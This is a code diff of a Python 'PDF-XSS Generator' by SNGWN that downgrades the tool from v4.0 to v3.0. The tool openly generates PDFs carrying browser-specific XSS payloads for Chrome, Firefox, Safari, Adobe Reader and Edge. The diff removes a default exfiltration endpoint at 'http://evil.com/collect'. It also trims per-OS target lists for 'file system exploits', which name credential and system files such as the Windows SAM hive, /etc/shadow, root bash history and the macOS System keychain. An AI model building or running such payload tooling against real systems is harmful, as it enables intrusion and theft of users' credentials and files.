@@ -1,20 +1,17 @@
 #!/usr/bin/env python3
 """
-PDF-XSS Generator v4.0 - Advanced Browser-Specific PDF Payload Generator
-=========================================================================
+PDF-XSS Generator v3.0 - Optimized Browser-Specific PDF Payload Generator
+==========================================================================
 
-Enhanced PDF XSS payload generator with advanced features and comprehensive testing.
-Combines payloads from JSON databases and generates sophisticated PDF files with XSS payloads.
+Simplified and optimized PDF XSS payload generator with browser-specific targeting.
+Combines payloads from JSON databases and generates PDF files with XSS payloads.
 
 Features:
-- Enhanced browser-specific JSON payload databases
-- Advanced command-line interface with configuration support
-- Comprehensive payload validation and quality scoring
-- Advanced PDF generation with multiple formats and structures
-- OS-aware file system targeting with enhanced detection
-- Real-time payload optimization and effectiveness tracking
-- Integrated testing framework and result analysis
-- Comprehensive logging and reporting capabilities
+- Browser-specific JSON payload databases
+- Simplified command-line interface  
+- One payload per page for browser-specific files
+- Clean PDF generation with complete payload visibility
+- OS-aware file system targeting
 
 Supported Browsers: Chrome, Firefox, Safari, Adobe Reader, Microsoft Edge
 """
@@ -24,192 +21,31 @@ import json
 import os
 import sys
 import platform
-import logging
-import hashlib
-import random
-import time
 from datetime import datetime
-from urllib.parse import urlparse
 
 if sys.version_info[0] < 3:
     raise SystemExit("Use Python 3 (or higher) only")
 
 # Version and metadata
-VERSION = "4.0"
+VERSION = "3.0"
 AUTHOR = "SNGWN"
 
-def load_configuration():
-    """Load configuration from config.json file"""
-    config_file = 'config.json'
-    default_config = {
-        "pdf_xss_config": {
-            "general": {
-                "default_url": "http://evil.com/collect",
-                "default_output_dir": "Files",
-                "default_pdf_version": "1.7",
-                "enable_os_detection": True,
-                "enable_payload_validation": True
-            }
-        }
-    }
-    
-    if not os.path.exists(config_file):
-        print(f"⚠️  Configuration file not found: {config_file}")
-        print("Using default configuration...")
-        return default_config
-    
-    try:
-        with open(config_file, 'r', encoding='utf-8') as f:
-            config = json.load(f)
-            print(f"✅ Configuration loaded from {config_file}")
-            return config
-    except Exception as e:
-        print(f"❌ Error loading configuration: {e}")
-        print("Using default configuration...")
-        return default_config
-
-def setup_logging(config):
-    """Setup logging based on configuration"""
-    logging_config = config.get('pdf_xss_config', {}).get('security_features', {}).get('logging', {})
-    
-    if not logging_config.get('enabled', True):
-        return
-    
-    log_file = logging_config.get('log_file', 'pdf_xss_generation.log')
-    log_level = getattr(logging, logging_config.get('log_level', 'INFO').upper())
-    
-    logging.basicConfig(
-        level=log_level,
-        format='%(asctime)s - %(levelname)s - %(message)s',
-        handlers=[
-            logging.FileHandler(log_file),
-            logging.StreamHandler()
-        ]
-    )
-    
-    logging.info(f"PDF-XSS Generator v{VERSION} started")
-    logging.info(f"Platform: {platform.system()} {platform.release()}")
-
-def validate_payload_quality(payload_data, config):
-    """Enhanced payload validation with quality scoring"""
-    validation_config = config.get('pdf_xss_config', {}).get('security_features', {}).get('payload_validation', {})
-    
-    if not validation_config.get('enabled', True):
-        return True, 100, "Validation disabled"
-    
-    payload = payload_data.get('payload', '')
-    quality_score = payload_data.get('quality_score', 0)
-    
-    # Syntax validation
-    if validation_config.get('syntax_check', True):
-        paren_count = payload.count('(') - payload.count(')')
-        brace_count = payload.count('{') - payload.count('}')
-        
-        if paren_count != 0 or brace_count != 0:
-            return False, 0, "Syntax error: unbalanced brackets"
-    
-    # Security analysis
-    if validation_config.get('security_analysis', True):
-        risk_level = payload_data.get('risk_level', 'low')
-        safe_mode = config.get('pdf_xss_config', {}).get('security_features', {}).get('safe_mode', {})
-        
-        if safe_mode.get('enabled', False):
-            max_risk = safe_mode.get('max_risk_level', 'medium')
-            risk_levels = ['low', 'medium', 'high', 'critical']
-            if risk_levels.index(risk_level) > risk_levels.index(max_risk):
-                return False, 0, f"Risk level {risk_level} exceeds safe mode limit {max_risk}"
-    
-    # Quality scoring
-    if validation_config.get('quality_scoring', True):
-        if quality_score < 20:
-            logging.warning(f"Low quality payload detected: {payload_data.get('id', 'unknown')} (score: {quality_score})")
-    
-    return True, quality_score, "Valid"
 def get_os_specific_paths():
-    """Get OS-specific file paths for file system exploits with enhanced detection"""
+    """Get OS-specific file paths for file system exploits"""
     current_os = platform.system().lower()
     
-    # Enhanced OS detection
     if current_os == 'windows':
         return {
             'sensitive_files': [
                 'file:///C:/Windows/System32/calc.exe',
                 'file:///C:/Windows/System32/cmd.exe', 
                 'file:///C:/Windows/System32/drivers/etc/hosts',
-                'file:///C:/Windows/win.ini',
-                'file:///C:/Windows/System32/config/SAM',
-                'file:///C:/Windows/System32/config/SYSTEM',
-                'file:///C:/Users/Administrator/Desktop/',
-                'file:///C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe'
+                'file:///C:/Windows/win.ini'
             ],
             'directories': [
                 'file:///C:/Windows/System32/',
                 'file:///C:/Users/',
-                'file:///C:/Program Files/',
-                'file:///C:/Windows/Temp/',
-                'file:///C:/ProgramData/',
-                'file:///C:/Windows/System32/config/'
-            ]
-        }
-    elif current_os == 'darwin':  # macOS
-        return {
-            'sensitive_files': [
-                'file:///etc/passwd',
-                'file:///System/Library/CoreServices/SystemVersion.plist',
-                'file:///Users/',
-                'file:///Applications/',
-                'file:///System/Library/LaunchDaemons/',
-                'file:///private/var/db/dslocal/nodes/Default/users/',
-                'file:///Library/Keychains/System.keychain',
-                'file:///System/Library/Security/authorization.plist'
-            ],
-            'directories': [
-                'file:///Applications/',
-                'file:///Users/',
-                'file:///System/',
-                'file:///Library/',
-                'file:///private/var/',
-                'file:///usr/local/'
-            ]
-        }
-    elif current_os == 'linux':
-        return {
-            'sensitive_files': [
-                'file:///etc/passwd',
-                'file:///etc/shadow',
-                'file:///etc/hosts',
-                'file:///home/',
-                'file:///root/.bash_history',
-                'file:///etc/sudoers',
-                'file:///proc/version',
-                'file:///etc/ssh/sshd_config'
-            ],
-            'directories': [
-                'file:///etc/',
-                'file:///home/',
-                'file:///usr/bin/',
-                'file:///var/log/',
-                'file:///tmp/',
-                'file:///proc/'
-            ]
-        }
-    else:  # Android or other
-        return {
-            'sensitive_files': [
-                'file:///system/build.prop',
-                'file:///data/system/users/0/settings_secure.xml',
-                'file:///system/etc/hosts',
-                'file:///data/data/',
-                'file:///system/framework/',
-                'file:///proc/cpuinfo'
-            ],
-            'directories': [
-                'file:///system/',
-                'file:///data/',
-                'file:///sdcard/',
-                'file:///storage/',
-                'file:///proc/',
-                'file:///sys/'
+                'file:///C:/Program Files/'
             ]
         }
     elif current_os == 'darwin':  # macOS
